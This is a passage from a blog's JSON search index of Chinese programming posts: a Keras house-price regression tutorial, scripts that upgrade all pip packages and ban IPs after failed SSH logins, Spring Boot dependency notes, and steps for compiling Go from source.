test_data -= mean test_data /= std 构建网络 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # 构建网络 from keras import models from keras import layers def build_model(): model = models.Sequential() model.add(layers.Dense(64, activation=\u0026#39;relu\u0026#39;, input_shape=(train_data.shape[1], ))) model.add(layers.Dense(64, activation=\u0026#39;relu\u0026#39;)) model.add(layers.Dense(1)) model.compile(optimizer=\u0026#39;rmsprop\u0026#39;, loss=\u0026#39;mse\u0026#39;, metrics=[\u0026#39;mae\u0026#39;]) \u0026#34;\u0026#34;\u0026#34; Q：为什么这个网络最后一层不使用激活函数？ A：不使用激活函数的话这就是一个线性层。 这是标量回归（标量回归是预测单一连续值的回归）的典型设置。 添加激活函数将会限制输出范围。 例如，如果向最后一层添加sigmoid激活函数，网络只能学会预测0~1范围内的值。 这里最后一层是纯线性的，所以网络可以学会预测任意范围内的值。 \u0026#34;\u0026#34;\u0026#34; return model 使用K折验证训练模型 **提示：**由于我们每次训练的训练轮数为500次，并且训练时开启了静默模式。如果输出结果长时间没有变化请耐心等候。不要误认为程序出错没有执行！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # K折验证 \u0026#34;\u0026#34;\u0026#34; Q：为什么我们需要使用K折验证？ A：因为数据量太少。 如果选择只使用数据集一次，那么训练结果会和数据的分布情况有很大相关性。 数据集分布不同输出结果会有很大差异，即误差较大，这不符合泛化的理念。 使用K折验证可以减小这种误差。 \u0026#34;\u0026#34;\u0026#34; import numpy as np k = 4 num_val_samples = len(train_data) // 4 num_epochs = 500 all_source = [] all_mae_histories = [] for i in range(k): print(\u0026#39;processing fold #\u0026#39;, i) val_data = train_data[i * num_val_samples : (i + 1) * num_val_samples] val_targets = train_targets[i*num_val_samples:(i+1)*num_val_samples] partial_train_data = np.concatenate([train_data[:i * num_val_samples], train_data[(i + 1)*num_val_samples:]], axis=0) partial_train_targets = np.concatenate([train_targets[:i*num_val_samples], train_targets[(i+1)*num_val_samples:]], axis=0) model = build_model() history = model.fit(partial_train_data, partial_train_targets, validation_data=(val_data, val_targets), epochs=num_epochs, batch_size=1, verbose=0) # val_mse, val_mae = model.evaluate(val_data, val_targets, verbose=0) # all_source.append(val_mae) print(history.history.keys()) mae_history = history.history[\u0026#39;val_mae\u0026#39;] all_mae_histories.append(mae_history) 绘制图表观测训练过程 1 2 # 计算所有轮次中的K折验证分数平均值 average_mae_history = [np.mean([x[i] for x in all_mae_histories]) for i in range(num_epochs)] 1 2 3 4 5 6 7 # 绘制验证分数 import matplotlib.pyplot as plt plt.plot(range(1, len(average_mae_history)+1), average_mae_history) plt.xlabel(\u0026#39;Epochs\u0026#39;) plt.ylabel(\u0026#39;Validation MAE\u0026#39;) plt.show() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # 绘制验证分数，删除前十个点 \u0026#34;\u0026#34;\u0026#34; Q：为什么要重新绘制图表？ A：因为纵轴的范围较大，且数据方差相对较大，难以看清这张图的规律。 Q：怎样优化图表？ A：删除前10个数据点，因为它们的取值范围与曲线上的其他点不同。 将每个数据点替换为前面数据点的指数移动平均值，以得到光滑的曲线。 \u0026#34;\u0026#34;\u0026#34; def smooth_curve(points, factor=0.9): smoothed_points = [] for point in points: if smoothed_points: previous = smoothed_points[-1] smoothed_points.append(previous * factor + point * (1 - factor)) else: smoothed_points.append(point) return smoothed_points smooth_mae_history = smooth_curve(average_mae_history[10:]) plt.plot(range(1, len(smooth_mae_history) + 1), smooth_mae_history) plt.xlabel(\u0026#39;Epochs\u0026#39;) plt.ylabel(\u0026#39;Validation MAE\u0026#39;) plt.show() 训练最终模型 1 2 3 4 5 6 7 8 # 训练最终模型 model = build_model() model.fit(train_data, train_targets, epochs=80, batch_size=16, verbose=0) test_mes_score, test_mae_score = model.evaluate(test_data, test_targets) # 输出最终结果 print(test_mae_score) # 2.509598970413208 小结 回归问题使用的损失函数与分类问题不同，回归常用的损失函数是均方误差（MSE）。 回归问题使用的评估指标也与分类问题不同，精度的概念不适用于回归问题。常见的回归指标是平均绝对误差（MAE）。 如果输入数据的特征具有不同的取值范围，应该先进行预处理，对每个特征单独进行缩放。 如果可用的数据很少，使用K折验证可以可靠地评估模型。 如果可用的训练数据很少，最好使用隐藏层较少（通常只有一到两个）的小型网络，以避免严重的过拟合。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E9%A2%84%E6%B5%8B%E6%88%BF%E4%BB%B7%E5%9B%9E%E5%BD%92%E9%97%AE%E9%A2%98/","title":"预测房价：回归问题"},{"content":"利用Python脚本一次性更新所有的库\n1 2 3 4 5 6 7 8 9 from subprocess import call from pip._internal.utils.misc import get_installed_distributions total = len(get_installed_distributions()) # 获取库的数量 for dist,count in zip(get_installed_distributions(), range(1, total + 1)): call(\u0026#34;pip install --upgrade \u0026#34; + dist.project_name, shell=True) # 执行pip更新命令 print(\u0026#34;总计{}个库，正在更新第{}个库，还剩{}库待更新，请耐心等待…\u0026#34;.format(total, count, total-count)) # 显示信息 print(\u0026#34;更新完毕！\u0026#34;) ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0-python-%E7%9A%84%E6%89%80%E6%9C%89%E5%BA%93/","title":"自动更新 Python 的所有库"},{"content":"自动禁用登录失败的 ssh IP 自动禁用登录失败的 IP 脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #!/bin/bash journalctl -u sshd.service | awk \u0026#39;/Failed/{print $(NF-3)}\u0026#39;|sort|uniq -c|awk \u0026#39;{print $2\u0026#34;=\u0026#34;$1;}\u0026#39; \u0026gt; /root/black.list while IFS= read -r line do IP=$(echo \u0026#34;$line\u0026#34; | awk -F= \u0026#39;{print $1}\u0026#39;) NUM=$(echo \u0026#34;$line\u0026#34; | awk -F= \u0026#39;{print $2}\u0026#39;) # 失败次数大于 3 则禁用 IP if [ \u0026#34;$NUM\u0026#34; -ge 3 ]; then grep \u0026#34;$IP\u0026#34; /etc/hosts.deny \u0026gt; /dev/null if [ $? -gt 0 ]; then echo \u0026#34;sshd:$IP:deny\u0026#34; \u0026gt;\u0026gt; /etc/hosts.deny fi fi done \u0026lt; /root/black.list 将脚本加入定时任务：\n1 2 3 4 crontab -e # 每分钟执行一次脚本 */1 * * * * sh /root/ssh_deny.sh ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%87%AA%E5%8A%A8%E7%A6%81%E7%94%A8%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5%E7%9A%84-ssh-ip/","title":"自动禁用登录失败的 ssh IP"},{"content":"自动配置原理 Spring Boot 自动配置原理解析 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;!-- 跟踪父工程 --\u0026gt; \u0026lt;!-- pom.xml --\u0026gt; \u0026lt;parent\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-parent\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.3.2.RELEASE\u0026lt;/version\u0026gt; \u0026lt;relativePath/\u0026gt; \u0026lt;!-- lookup parent from repository --\u0026gt; \u0026lt;/parent\u0026gt; \u0026lt;!-- spring-boot-starter-parent-2.3.2.RELEASE.pom --\u0026gt; \u0026lt;parent\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-dependencies\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.3.2.RELEASE\u0026lt;/version\u0026gt; \u0026lt;/parent\u0026gt; \u0026lt;!-- spring-boot-dependencies-2.3.2.RELEASE.pom --\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-dependencies\u0026lt;/artifactId\u0026gt; 最终在 spring-boot-dependencies 下发现了所有依赖以及其对应的版本号：\n1 2 3 4 5 \u0026lt;properties\u0026gt; \u0026lt;activemq.version\u0026gt;5.15.13\u0026lt;/activemq.version\u0026gt; \u0026lt;antlr2.version\u0026gt;2.7.7\u0026lt;/antlr2.version\u0026gt; ...... \u0026lt;/properties\u0026gt; 因此在Spring Boot的项目中，核心依赖在父工程中已经配好，我们只需要调用即可.\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E5%8E%9F%E7%90%86/","title":"自动配置原理"},{"content":"自行编译 Go 1 2 3 4 5 6 7 8 9 10 11 12 # 1. 下载源码 wget https://github.com/golang/go/archive/refs/tags/go1.21.3.tar.gz # 2. 安装依赖 apt install golang gcc # 3. 解压并进入src目录 tar -zxvf go1.21.3.tar.gz cd go-go1.21.3/src # 编译 ./all.bash ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%87%AA%E8%A1%8C%E7%BC%96%E8%AF%91-go/","title":"自行编译 Go"}]